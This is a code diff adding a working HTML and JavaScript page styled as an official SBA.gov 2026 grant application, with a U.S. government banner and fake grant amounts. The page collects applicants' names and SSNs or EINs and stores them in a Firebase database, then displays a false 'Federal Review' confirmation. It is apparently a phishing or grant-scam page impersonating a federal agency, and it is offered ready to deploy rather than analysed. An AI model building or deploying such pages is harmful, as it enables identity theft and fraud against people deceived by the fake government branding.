@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA Portal | 2026 Grant Application</title>
+    <style>
+        :root { --sba-blue: #00274c; --sba-red: #ba0c2f; --sba-accent: #0071bc; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
+        
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+        
+        .container { max-width: 500px; margin: 0 auto; padding: 15px; }
+        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border-top: 6px solid var(--sba-blue); }
+        
+        label { display: block; font-size: 11px; font-weight: 900; color: var(--sba-blue); margin: 18px 0 6px; text-transform: uppercase; letter-spacing: 0.8px; }
+        input, textarea, select { 
+            width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #cbd5e1; 
+            font-size: 15px; outline: none; box-sizing: border-box; background: #fcfcfc;
+            transition: border 0.3s;
+        }
+        
+        .submit-btn { background: var(--sba-blue); color: white; padding: 18px; border-radius: 8px; width: 100%; font-weight: 800; border: none; margin-top: 25px; cursor: pointer; text-transform: uppercase; letter-spacing: 1.5px; }
+        .submit-btn:disabled { background: #94a3b8; cursor: not-allowed; }
+
+        #checkOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 2000; color: var(--sba-blue); font-weight: bold; font-size: 14px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--sba-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .legal-notice { background: #fff5f5; border: 1px solid #fed7d7; padding: 15px; border-radius: 8px; margin-top: 20px; display: flex; gap: 12px; }
+    </style>
+</head>
+<body>
+
+    <div id="checkOverlay">
+        <div class="loader"></div>
+        <div style="letter-spacing:1px;">SECURE ELIGIBILITY CHECK...</div>
+    </div>
+
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE APPLICATION
+    </div>
+
+    <div class="nav-header">
+        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px; font-weight: 900;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:6px 15px; border-radius:4px; font-size:10px; font-weight:bold;">EXIT</button>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <h2 style="color: var(--sba-blue); font-size: 22px; margin: 0 0 5px;">Grant Application</h2>
+            <p style="font-size:11px; color:#64748b; margin-bottom:20px;">
+                FY2026 EIDR Program | Ref: <span id="appId" style="color: var(--sba-accent); font-weight: 900;"></span>
+            </p>
+            
+            <form id="applyForm">
+                <label>Legal Business Name / Full Name</label>
+                <input type="text" id="bizName" placeholder="Enter legally registered name" required>
+
+                <label>Federal Tax ID (SSN / EIN)</label>
+                <input type="text" id="taxId" placeholder="xxx-xx-xxxx" required>
+
+                <label>Grant Allocation Tier</label>
+                <select id="reqAmt">
+                    <option value="45000">$45,000.00 (Standard Tier)</option>
+                    <option value="75000">$75,000.00 (Intermediate Tier)</option>
+                    <option value="125000">$125,000.00 (Maximum Allocation)</option>
+                </select>
+
+                <label>Purpose of Funds</label>
+                <textarea id="reason" style="height:100px; resize: none;" placeholder="Provide a brief explanation..." required></textarea>
+
+                <div class="legal-notice">
+                    <input type="checkbox" id="legalCheck" style="width: 22px; height: 22px; margin-top: 3px;" required>
+                    <p style="font-size: 10px; color: #742a2a; line-height: 1.5; margin: 0; font-weight: 500;">
+                        I certify under <b>18 U.S.C. § 1001</b> that the information provided is accurate. Fraudulent applications are subject to federal investigation.
+                    </p>
+                </div>
+
+                <button type="submit" id="submitAppBtn" class="submit-btn">SUBMIT TO REVIEW BOARD</button>
+            </form>
+        </div>
+    </div>
+
+    <script type="module">
+        import { auth, db } from './firebase-config.js';
+        import { doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        const generatedId = "SBA-2026-" + Math.floor(100000 + Math.random() * 900000);
+        document.getElementById('appId').innerText = generatedId;
+
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) window.location.href = 'index.html';
+            
+            const snap = await getDoc(doc(db, "users", user.uid));
+            if(snap.exists()) {
+                const data = snap.data();
+                
+                // --- LOCK IF ALREADY SUBMITTED ---
+                if (data.appStatus === "SUBMITTED" || data.appStatus === "APPROVED") {
+                    document.getElementById('submitAppBtn').disabled = true;
+                    document.getElementById('submitAppBtn').innerText = "APPLICATION PENDING";
+                    alert("System Notice: You have an application already under review.");
+                    window.location.href = 'dashboard.html';
+                }
+
+                // Hide loader
+                setTimeout(() => document.getElementById('checkOverlay').style.display = 'none', 1000);
+            }
+        });
+
+        document.getElementById('applyForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submitAppBtn');
+            btn.innerText = "TRANSMITTING DATA...";
+            btn.disabled = true;
+
+            try {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                    bizName: document.getElementById('bizName').value,
+                    taxId: document.getElementById('taxId').value,
+                    requestedAmount: document.getElementById('reqAmt').value,
+                    appStatus: "SUBMITTED",
+                    applicationId: generatedId
+                });
+
+                alert("SUBMISSION SUCCESSFUL\n\nYour application has been received for Federal Review.");
+                window.location.href = 'dashboard.html';
+            } catch(err) {
+                alert("Error: " + err.message);
+                btn.disabled = false;
+                btn.innerText = "SUBMIT TO REVIEW BOARD";
+            }
+        };
+    </script>
+</body>
+</html>
